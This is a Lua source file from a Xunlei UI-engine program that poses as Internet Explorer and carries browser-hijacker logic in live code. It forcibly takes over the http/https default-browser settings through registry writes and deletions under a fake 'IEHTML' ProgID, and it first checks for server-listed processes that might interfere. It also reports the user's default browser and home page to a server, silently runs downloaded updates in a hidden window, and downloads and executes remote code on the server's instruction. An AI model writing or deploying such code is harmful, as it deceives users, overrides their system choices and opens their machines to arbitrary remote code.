local tipUtil = XLGetObject("API.Util")
local tipAsynUtil = XLGetObject("API.AsynUtil")
local gnLastReportRunTmUTC = 0

-----------------

function RegisterFunctionObject()
	local strFunhelpPath = __document.."\\..\\functionhelper.lua"
	XLLoadModule(strFunhelpPath)
	
	local tFunH = XLGetGlobal("YBYL.FunctionHelper")
	if type(tFunH) ~= "table" then
		return false
	else
		return true
	end
end


function LoadIEHelper()
	local strIEHelperPath = __document.."\\..\\IEMenuHelper.lua"
	XLLoadModule(strIEHelperPath)
end


function IsNilString(AString)
	if AString == nil or AString == "" then
		return true
	end
	return false
end

function IsRealString(str)
	return type(str) == "string" and str ~= ""
end


function FetchValueByPath(obj, path)
	local cursor = obj
	for i = 1, #path do
		cursor = cursor[path[i]]
		if cursor == nil then
			return nil
		end
	end
	return cursor
end

function ShowMainTipWnd(objMainWnd)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	objMainWnd:Show(5)
	objMainWnd:SetTitle("Internet Explorer")
	SendStartupReport(true)
	
	FunctionObj.RestoreWndSize()
end


function SendStartupReport(bShowWnd)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tStatInfo = {}
	
	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
	tStatInfo.strEL = strSource or ""
	
	if not bShowWnd then
		tStatInfo.strEC = "launch"  --进入上报
		tStatInfo.strEA = FunctionObj.GetInstallSrc() or ""
		tStatInfo.strEL = strSource or ""
	else
		tStatInfo.strEC = "showui" 	 --展示上报
		tStatInfo.strEA = strSource or ""
		tStatInfo.strEL = FunctionObj.GetMinorVerFormat() or ""
	end
		
	tStatInfo.strEV = 1
	
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		item:KillTimer(id)
		FunctionObj.TipConvStatistic(tStatInfo)
	end, 1000)
end


function SendUserInfoReport()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	
	local bHasSend = CheckHasSendUserInfo()
	if bHasSend then
		return
	end
	
	local tStatBrow = {}
	
	local strSource = FunctionObj.GetInstallSrc()
	
	tStatBrow.strEL = strSource or ""
	tStatBrow.strEV = 1
	tStatBrow.strEC = "defaultbrowser"  --默认浏览器
	tStatBrow.strEA = FunctionObj.GetDefaultBrowser() or ""
	FunctionObj.DelayTipConvStatistic(tStatBrow)
	
	local tStatHP = {}
	tStatHP.strEL = strSource or ""
	tStatHP.strEV = 1
	tStatHP.strEC = "iehomepage"  --首页
	tStatHP.strEA = FunctionObj.GetHomePageFromReg() or ""
	FunctionObj.DelayTipConvStatistic(tStatHP)
	
	SaveLastReportBrowser()
end


function CheckHasSendUserInfo()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	local nLastReportBrowser = tUserConfig["nLastReportBrowser"] or 0
	
	if FunctionObj.CheckTimeIsAnotherDay(nLastReportBrowser) then
		return false
	else
		return true
	end
end


function SaveLastReportBrowser()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	tUserConfig["nLastReportBrowser"] = tipUtil:GetCurrentUTCTime()
	
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
end


function CheckForceVersion(tForceVersion)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	if type(tForceVersion) ~= "table" then
		return false
	end

	local bRightVer = false
	
	local strCurVersion = FunctionObj.GetExeVersion()
	local _, _, _, _, _, strCurVersion_4 = string.find(strCurVersion, "(%d+)%.(%d+)%.(%d+)%.(%d+)")
	local nCurVersion_4 = tonumber(strCurVersion_4)
	if type(nCurVersion_4) ~= "number" then
		return bRightVer
	end
	for iIndex = 1, #tForceVersion do
		local strRange = tForceVersion[iIndex]
		local iPos = string.find(strRange, "-")
		if iPos ~= nil then
			local lVer = tonumber(string.sub(strRange, 1, iPos - 1))
			local hVer = tonumber(string.sub(strRange, iPos + 1))
			if lVer ~= nil and hVer ~= nil and nCurVersion_4 >= lVer and nCurVersion_4 <= hVer then
				bRightVer = true
				break
			end
		else
			local verFlag = tonumber(strRange)
			if verFlag ~= nil and nCurVersion_4 == verFlag then
				bRightVer = true
				break
			end
		end
	end
	
	return bRightVer
end


function TryForceUpdate(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	if FunctionObj.CheckIsUpdating() then
		FunctionObj.TipLog("[TryForceUpdate] CheckIsUpdating failed,another thread is updating!")
		return
	end

	local bPassCheck = FunctionObj.CheckCommonUpdateTime(1)
	if not bPassCheck then
		FunctionObj.TipLog("[TryForceUpdate] CheckCommonUpdateTime failed")
		return		
	end

	local tNewVersionInfo = tServerConfig["tNewVersionInfo"] or {}
	local tForceUpdate = tNewVersionInfo["tForceUpdate"]
	if(type(tForceUpdate)) ~= "table" then
		return 
	end
	
	local strCurVersion = FunctionObj.GetExeVersion()
	local strNewVersion = tForceUpdate.strVersion		
	if not IsRealString(strCurVersion) or not IsRealString(strNewVersion)
		or not FunctionObj.CheckIsNewVersion(strNewVersion, strCurVersion) then
		return
	end
	
	local tVersionLimit = tForceUpdate["tVersion"]
	local bPassCheck = CheckForceVersion(tVersionLimit)
	FunctionObj.TipLog("[TryForceUpdate] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
	if not bPassCheck then
		return 
	end
	
	FunctionObj.SetIsUpdating(true)
	
	FunctionObj.DownLoadNewVersion(tForceUpdate, function(strRealPath) 
		FunctionObj.SetIsUpdating(false)
	
		if not IsRealString(strRealPath) then
			return
		end
		
		FunctionObj.SaveCommonUpdateUTC()
		local strCmd = " /write /silent /run"
		tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
	end)
end


function TryExecuteExtraCode(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tExtraHelper = tServerConfig["tExtraHelper"] or {}
	local strURL = tExtraHelper["strURL"]
	local strMD5 = tExtraHelper["strMD5"]
	
	if not IsRealString(strURL) then
		return
	end
	local strHelperName = FunctionObj.GetFileSaveNameFromUrl(strURL)
	local strSaveDir = tipUtil:GetSystemTempPath()
	local strSavePath = tipUtil:PathCombine(strSaveDir, strHelperName)
	
	FunctionObj.DownLoadFileWithCheck(strURL, strSavePath, strMD5
	, function(bRet, strRealPath)
		FunctionObj.TipLog("[TryExecuteExtraCode] strURL:"..tostring(strURL)
		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
				
		if bRet < 0 then
			return
		end
		
		FunctionObj.TipLog("[TryExecuteExtraCode] begin execute extra helper")
		XLLoadModule(strRealPath)
	end)	
end


--改userconfig中的首页字段
function TrySetConfigHomePage(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	FunctionObj.TipLog("[TrySetConfigHomePage] begin ")
	
	if type(tServerConfig) ~= "table" or type(tServerConfig["tURLMap"]) ~= "table" then
		FunctionObj.TipLog("[TrySetConfigHomePage] tURLMap not a table ")
		return false
	end
	
	local tURLMap = tServerConfig["tURLMap"]
	local strInstallSrc = FunctionObj.GetInstallSrc()
	
	for strSource, strURL in pairs(tURLMap) do
		if string.lower(strSource) == string.lower(strInstallSrc) 
			and IsRealString(strURL) then
			FunctionObj.SetHomePage(strURL)
			FunctionObj.TipLog("[TrySetConfigHomePage] seturl: "..tostring(strURL))
			return true
		end
	end
	
	return false
end


function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig")
	--FunctionObj.TipLog("[TrySetDefaultBrowser] enter")
	
	--DoSetDefaultBrowser()
	
	local tDefaultBrowser = tServerConfig["tDefaultBrowser"]
	if type(tDefaultBrowser) ~= "table" or type(tUserConfig) ~= "table" then
		FunctionObj.TipLog("[TrySetDefaultBrowser] get table info failed")
		return false
	end

	if not bIgnoreSpanTime then
		local nSpanTimeInSec = tDefaultBrowser["nSpanTimeInSec"] or 24*3600
		local nLastSetDefaultUTC = tUserConfig["nLastSetDefaultUTC"] or 0
		local bPassCheck = CheckSpanTime(nLastSetDefaultUTC, nSpanTimeInSec)
		if not bPassCheck then
			FunctionObj.TipLog("[TrySetDefaultBrowser] CheckSpanTime failed")
			return false
		end
	end

	local strBlackList = tDefaultBrowser["strBlackList"] or ""
	local bPassCheck = CheckProcessList(strBlackList)
	if not bPassCheck then
		FunctionObj.TipLog("[TrySetDefaultBrowser] CheckProcessList failed")
		return false
	end

	local strBrowserList = tDefaultBrowser["strBrowserList"] or ""
	local bPassCheck = CheckBrowserList(strBrowserList)
	if not bPassCheck then
		FunctionObj.TipLog("[TrySetDefaultBrowser] strBrowserList failed")
		return false
	end
	
	local bSuccess = DoSetDefaultBrowser()
	if not bSuccess then
		FunctionObj.TipLog("[TrySetDefaultBrowser] DoSetDefaultBrowser failed")
		return false
	end	
		
	tUserConfig["nLastSetDefaultUTC"] = tipUtil:GetCurrentUTCTime()
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
	return true
end


function SendSetDefBrowReport(bExit, strSource)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tStatInfo = {}

	tStatInfo.strEC = "setdefaultbrowser"  --进入上报
	tStatInfo.strEA = strSource or "local"
	tStatInfo.strEL = FunctionObj.GetInstallSrc() or ""
	tStatInfo.strEV = 1
	
	if bExit then
		tStatInfo.Exit = true
	end
	FunctionObj.TipConvStatistic(tStatInfo)
end


function CheckSpanTime(nLastRecordTime, nSpanTimeInSec)
	if tonumber(nLastRecordTime) == nil or tonumber(nLastRecordTime) == 0 
		or tonumber(nSpanTimeInSec) == nil or tonumber(nSpanTimeInSec) == 0 then
		return true
	end

	local nCurrentTime = tipUtil:GetCurrentUTCTime()
	if math.abs(nCurrentTime-nLastRecordTime) > nSpanTimeInSec then
		return true
	else
		return false
	end
end


function CheckProcessList(strProcessList)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tProcessList = FunctionObj.SplitStringBySeperator(strProcessList, ";") or {}
	
	for _, strProcessName in pairs(tProcessList) do
		local strExeName = strProcessName..".exe"
		local bExists = tipUtil:QueryProcessExists(strExeName)
		if bExists then
			FunctionObj.TipLog("[CheckProcessList] find process: "..tostring(strExeName))
			return false
		end
	end
	
	return true
end


function CheckBrowserList(strProcessList)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tProcessList = FunctionObj.SplitStringBySeperator(strProcessList, ";") or {}
	local strCruDefault = FunctionObj.GetDefaultBrowser()
	
	for _, strProcessName in pairs(tProcessList) do
		if string.find(strCruDefault, string.lower(strProcessName)) then
			FunctionObj.TipLog("[CheckBrowserList] find process: "..tostring(strProcessName))
			return true
		end
	end
	
	return false
end


function RedirectSysIEPath()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	
	local strFakeIEPath = FunctionObj.GetExePath()
	local strIERegPath = "HKEY_CLASSES_ROOT\\Applications\\iexplore.exe\\shell\\open\\command\\"
	local strOldIEPath = FunctionObj.RegQueryValue(strIERegPath)
	if IsRealString(strOldIEPath) and string.find(strOldIEPath, strFakeIEPath) then
		FunctionObj.TipLog("[RedirectSysIEPath] has set default browser -- Applications")
		return
	end
	
	local strCommand = "\""..strFakeIEPath.."\"  \"%1\""
	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRAppIE", strOldIEPath)
	FunctionObj.RegSetValue(strIERegPath, strCommand, true)
end

function IsWin7()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local sysVersion = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentVersion")
	
	if tonumber(sysVersion) and tonumber(sysVersion) > 6.0 and tonumber(sysVersion) < 6.2 then	
		return true
	end
	return false
end

-- 准备progid
function PrepareProgID(strProgID)
	local tFunHelper = XLGetGlobal("YBYL.FunctionHelper") 
	local bInfMode = true
	local bIs64 = tFunHelper.CheckIs64OS()
	tFunHelper.TipLog("PrepareProgID(strProgID)")
	
	local strBrowserPath = tFunHelper.GetExePath()
	local strBrowPathWithFix = "\""..strBrowserPath.."\""
	local strCommand = strBrowPathWithFix.." \"%1\""
		
	if not tFunHelper.IsUserAdmin() then
		strBrowPathWithFix = "\"\"\""..strBrowserPath.."\"\"\""
		strCommand = strBrowPathWithFix.." \"\"\"%1\"\"\""
	end
	
	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\")
	if not IsRealString(strRegValue) then
		tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\shell\\open\\command")
		tFunHelper.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\", strCommand, bIs64, bInfMode)
	end

	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon")
	if not IsRealString(strRegValue) then
		tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\Application")
		tFunHelper.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon", strBrowPathWithFix, bIs64, bInfMode)
	end

	
	-- 设置默认图标
	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\DefaultIcon\\")
	if not IsRealString(strRegValue) then
		local strRegIconPath = "HKEY_CLASSES_ROOT\\IE.HTTP\\DefaultIcon\\"
		local strIcoPath = tFunHelper.RegQueryValue(strRegIconPath)

		if IsRealString(strIcoPath) then
			tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\DefaultIcon")
			tFunHelper.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\DefaultIcon\\", strIcoPath, bIs64, bInfMode) 
		end
	end
	
	if IsWin7() then
		local userChoiceReg = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\\Progid"
		local userChoice = tFunHelper.RegQueryValue(userChoiceReg)
		if userChoice then
			tFunHelper.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRProgid", userChoice, "REG_SZ")
		end
		tFunHelper.DelRegValueInUAC("HKEY_CURRENT_USER", "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", "Progid")
	end
	
	tFunHelper.DelRegValueInUAC("HKEY_CLASSES_ROOT", "http\\shell", "")
	
	local bIs64 = tFunHelper.CheckIs64OS()
	tFunHelper.CommitRegOperation(bIs64)
	
	-- local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\")
	-- if not IsRealString(strRegValue) then
		-- return false --写失败
	-- end
	
	-- local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon")
	-- if not IsRealString(strRegValue) then
		-- return false --写失败
	-- end
	
	return true
end


function SetFakeIERegInUAC(strCommand)
	local tFunHelper = XLGetGlobal("YBYL.FunctionHelper") 
	local strProgID = "IEHTML"
	tFunHelper.TipLog("SetFakeIERegInUAC(strProgID)")
	
	local bSuccess = PrepareProgID(strProgID)
	if not bSuccess then
		tFunHelper.TipLog("[SetFakeIERegInUAC] PrepareProgID failed ")
		return false
	end
	
	local bIs64 = tFunHelper.CheckIs64OS()
	local bRefresh = false
	--设置默认浏览器
	local strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\\Progid"
	local strRegValue = tFunHelper.RegQueryValue(strRegPath)
	if strRegValue ~= strProgID then
		tFunHelper.RegSetValue(strRegPath, strProgID, bIs64)
		tFunHelper.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HTTPProgid", strRegValue, bIs64)
		bRefresh = true
	end
	
	local strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\https\\UserChoice\\Progid"
	local strRegValue = tFunHelper.RegQueryValue(strRegPath)
	if strRegValue ~= strProgID then
		tFunHelper.RegSetValue(strRegPath, strProgID, bIs64)
		tFunHelper.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HTTPSProgid", strRegValue, bIs64)
		bRefresh = true
	end
	
	if bRefresh then
		tipUtil:RefleshIcon(nil)
	end
	
	return true
end


function DoSetDefaultBrowser()
	local tFunHelper = XLGetGlobal("YBYL.FunctionHelper") 
	tFunHelper.TipLog("[DoSetDefaultBrowser] begin")
	
	local strBrowserPath = tFunHelper.GetExePath()
	if not IsRealString(strBrowserPath) or not tipUtil:QueryFileExists(strBrowserPath) then
		return false
	end
	
	-- RedirectSysIEPath()
	
	local bSuccess = SetFakeIERegInUAC()
	if not bSuccess then
		return false
	end

	return true
end


function FixUserConfig(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tUserConfigInServer = tServerConfig["tUserConfigInServer"]
	if type(tUserConfigInServer) ~= "table" then
		return
	end

	local tLocalUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	tLocalUserConfig["nMaxUrlHistroy"] = tUserConfigInServer["nMaxUrlHistroy"] or 100
	tLocalUserConfig["nMaxUserCollect"] = tUserConfigInServer["nMaxUserCollect"] or 100
		
	if IsRealString(tUserConfigInServer["strOpenTabURL"]) then
		tLocalUserConfig["strOpenTabURL"] = tUserConfigInServer["strOpenTabURL"]
	end
	
	if type(tUserConfigInServer["tOpenStupURL"]) == "table" and #tUserConfigInServer["tOpenStupURL"] >1 then
		tLocalUserConfig["tOpenStupURL"] = tUserConfigInServer["tOpenStupURL"]
	end
	
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
end


function AnalyzeServerConfig(nDownServer, strServerPath)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	if nDownServer ~= 0 or not tipUtil:QueryFileExists(tostring(strServerPath)) then
		FunctionObj.TipLog("[AnalyzeServerConfig] Download server config failed , start tipmain ")
		-- TipMain()
		return	
	end
	
	local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
	TryForceUpdate(tServerConfig)
	FixUserConfig(tServerConfig)
	local bSetSuccess = TrySetDefaultBrowser(tServerConfig)
	if bSetSuccess then
		SendSetDefBrowReport(false)
	end
	
	TryExecuteExtraCode(tServerConfig)
end


function StartRunCountTimer()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	
	FunctionObj.SendRunTimeReport(0, false)
	
	local nTimeSpanInSec = 10 * 60 
	local nTimeSpanInMs = nTimeSpanInSec * 1000
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
		FunctionObj.SendRunTimeReport(nTimeSpanInSec, false)
		XLSetGlobal("YBYL.LastReportRunTime", gnLastReportRunTmUTC) 
	end, nTimeSpanInMs)
end


--弹出窗口--
local g_tPopupWndList = {
	-- [1] = {"TipHeadFullScrnWnd", "TipHeadFullScrnTree"},
}


function CreatePopupTipWnd()
	for key, tItem in pairs(g_tPopupWndList) do
		local strHostWndName = tItem[1]
		local strTreeName = tItem[2]
		local bSucc = CreateWndByName(strHostWndName, strTreeName)
	end
	
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	FunctionObj.InitToolTip()
	
	return true
end

function CreateWndByName(strHostWndName, strTreeName)
	local bSuccess = false
	local strInstWndName = strHostWndName..".Instance"
	local strInstTreeName = strTreeName..".Instance"
	
	local templateMananger = XLGetObject("Xunlei.UIEngine.TemplateManager")
	local frameHostWndTemplate = templateMananger:GetTemplate(strHostWndName, "HostWndTemplate" )
	if frameHostWndTemplate then
		local frameHostWnd = frameHostWndTemplate:CreateInstance(strInstWndName)
		if frameHostWnd then
			local objectTreeTemplate = nil
			objectTreeTemplate = templateMananger:GetTemplate(strTreeName, "ObjectTreeTemplate")
			if objectTreeTemplate then
				local uiObjectTree = objectTreeTemplate:CreateInstance(strInstTreeName)
				if uiObjectTree then
					frameHostWnd:BindUIObjectTree(uiObjectTree)
					local iRet = frameHostWnd:Create()
					if iRet ~= nil and iRet ~= 0 then
						bSuccess = true
					end
				end
			end
		end
	end

	return bSuccess
end

function DestroyPopupWnd()
	local hostwndManager = XLGetObject("Xunlei.UIEngine.HostWndManager")

	for key, tItem in pairs(g_tPopupWndList) do
		local strPopupWndName = tItem[1]
		local strPopupInst = strPopupWndName..".Instance"
		
		local objPopupWnd = hostwndManager:GetHostWnd(strPopupInst)
		if objPopupWnd then
			hostwndManager:RemoveHostWnd(strPopupInst)
		end
	end
end


function PopTipWnd(OnCreateFunc)
	local bSuccess = false
	local templateMananger = XLGetObject("Xunlei.UIEngine.TemplateManager")
	local frameHostWndTemplate = templateMananger:GetTemplate("TipMainWnd", "HostWndTemplate" )
	local frameHostWnd = nil
	if frameHostWndTemplate then
		frameHostWnd = frameHostWndTemplate:CreateInstance("YBYLTipWnd.MainFrame")
		if frameHostWnd then
			local objectTreeTemplate = nil
			objectTreeTemplate = templateMananger:GetTemplate("TipPanelTree", "ObjectTreeTemplate")
			if objectTreeTemplate then
				local uiObjectTree = objectTreeTemplate:CreateInstance("YBYLTipWnd.MainObjectTree")
				if uiObjectTree then
					frameHostWnd:BindUIObjectTree(uiObjectTree)
					local ret = OnCreateFunc(uiObjectTree)
					if ret then
						local iRet = frameHostWnd:Create()
						if iRet ~= nil and iRet ~= 0 then
							bSuccess = true
							ShowMainTipWnd(frameHostWnd)
						end
					end
				end
			end
		end
	end
	if not bSuccess then
		local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
		FunctionObj:FailExitTipWnd(4)
	end
end


function ProcessCommandLine()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	ProcessLocalCommand()      --解析自身的命令行
	
	local bHasOpenLink = ProcessIECommand()    --解析ie的命令行
	if bHasOpenLink then
		return
	end
	
	TryOpenURLWhenStup()
end


function ProcessLocalCommand()
end


--模拟解析ie命令行
function ProcessIECommand()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local bHasOpenLink = true
	local cmdString = tipUtil:GetCommandLine()
	local cmdList = tipUtil:CommandLineToList(cmdString)
	
	local bRet, strURL = FunctionObj.GetCommandStrValue4IE("-new")
	if bRet and FunctionObj.SimpleCheckIsURL(strURL) then
		FunctionObj.OpenURLInNewTab(strURL)
		return bHasOpenLink
	end
	
	local strURL = cmdList[1]
	if IsRealString(cmdString) and FunctionObj.SimpleCheckIsURL(strURL) then
		FunctionObj.OpenURLInNewTab(strURL)
		return bHasOpenLink
	end
	
	return not bHasOpenLink
end


function TryOpenURLWhenStup()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	FunctionObj.OpenURLWhenStup()
end


function CreateMainTipWnd()
	local function OnCreateFuncF(treectrl)
		local rootctrl = treectrl:GetUIObject("root.layout:root.ctrl")
		local bRet = rootctrl:SetTipData()			
		if not bRet then
			return false
		end
	
		return true
	end
	PopTipWnd(OnCreateFuncF)	
end


function TipMain() 
	CreateMainTipWnd()
	CreatePopupTipWnd()
	ProcessCommandLine()
end


function DoBackupBussiness()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	FunctionObj.TipLog("[DoBackupBussiness] enter")
	
	local bIgnoreSpanTime = false
	local bSetHomePage = false
	local bRet, strSource = FunctionObj.GetCommandStrValue("/setdefault")
	if not bRet then
		FunctionObj.TipLog("[DoBackupBussiness] check /setdefault false")
		return false
	end
	
	FunctionObj.TipLog("[DoBackupBussiness] strSource:"..tostring(strSource))
	
	local fnDownLoadCofig = FunctionObj.DownLoadServerConfig
	if IsRealString(strSource) 
		and (string.lower(strSource) == "ybylpacket" or string.lower(strSource) == "iepacket") then
		fnDownLoadCofig = FunctionObj.DownLoadInstallConfig
		-- bIgnoreSpanTime = true
		bSetHomePage = true
	end
	
	if type(fnDownLoadCofig) ~= "function" then
		FunctionObj.TipLog("[DoBackupBussiness] fnDownLoadCofig not a function")
		return false
	end
	
	fnDownLoadCofig(function (nDownServer, strServerPath)
		if nDownServer ~= 0 or not tipUtil:QueryFileExists(tostring(strServerPath)) then
			FunctionObj.TipLog("[DoBackupBussiness] Download server config failed , quit ")
			tipUtil:Exit("Exit")
			return	
		end
	
		local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
		if bSetHomePage then
			TrySetConfigHomePage(tServerConfig)
		end
		
		local bSetSuccess = TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
		if bSetSuccess then
			SendSetDefBrowReport(true, strSource)
		else
			tipUtil:Exit("Exit")
		end
	end)
	
	return true
end


function PreTipMain() 
	gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
	XLSetGlobal("YBYL.LastReportRunTime", gnLastReportRunTmUTC) 
	
	if not RegisterFunctionObject() then
		tipUtil:Exit("Exit")
	end
	
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
	FunctionObj.ReadAllConfigInfo()
	
	local bDoBackup = DoBackupBussiness()
	if bDoBackup then
		return
	end
	
	StartRunCountTimer()

	LoadIEHelper()	
		
	SendStartupReport(false)
	SendUserInfoReport()
	TipMain()
	
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		item:KillTimer(id)
		FunctionObj.DownLoadServerConfig(AnalyzeServerConfig)
	end, 1000)
end

PreTipMain()



